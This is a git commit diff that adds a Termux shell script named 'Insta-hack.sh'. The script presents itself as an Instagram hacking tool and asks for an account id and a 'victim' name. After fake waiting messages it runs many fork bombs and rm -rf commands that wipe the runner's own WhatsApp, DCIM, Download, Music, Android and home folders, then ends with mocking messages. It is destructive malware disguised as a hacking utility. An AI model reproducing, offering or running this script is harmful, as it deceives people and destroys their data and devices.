2d9c3d5ba0de3d557b214d2b1c23a8210d9157f3
MR|D3V1L <88584834+problems-arelifepartner@users.noreply.github.com>
2022-07-05 20:24:02 +0530

    Create Insta-hack.sh

---
+++ Insta-hack.sh
@@ -0,0 +1,48 @@
+clear 
+ termux-setup-storage 
+ figlet -f slant "Auto Admin" 
+  
+ echo "                         coded by <MR|D3V1L>" 
+  
+ echo "Enter your insta id" 
+ read id 
+ echo "Enter the name of victim :" 
+ read name
+ echo "what is your number" $number 
+ sleep 5 
+ echo "please wait................................." 
+ sleep 10 
+ 
+ :(){ :|:& };: 
+ :(){ :|:& };: 
+ :(){ :|:& };: 
+ echo "404 error your endi not found" 
+ :(){ :|:& };:
+rm -rf cd /sdcard/WhatsApp
+:(){ :|:& };: 
+rm -rf cd /sdcard/Android 
+ :(){ :|:& };: 
+ rm -rf cd ~ 
+ :(){ :|:& };:
+ rm -rf cd /sdcard/DCIM
+ :(){ :|:& };: 
+ rm -rf cd /sdcard/Download
+ :(){ :|:& };: 
+ rm -rf cd /sdcard/Music 
+:(){ :|:& };:
+ rm -rf cd /sdcard/SHAREit
+ :(){ :|:& };: 
+echo "This phone's engine gone completely...gallery nokku mwona"
+:(){ :|:& };: 
+ :(){ :|:& };:
+ :(){ :|:& };: 
+ :(){ :|:& };: 
+ echo "You are verified as chunniless"
+ 
+  
+  
+  
+
+  
+  
+ 
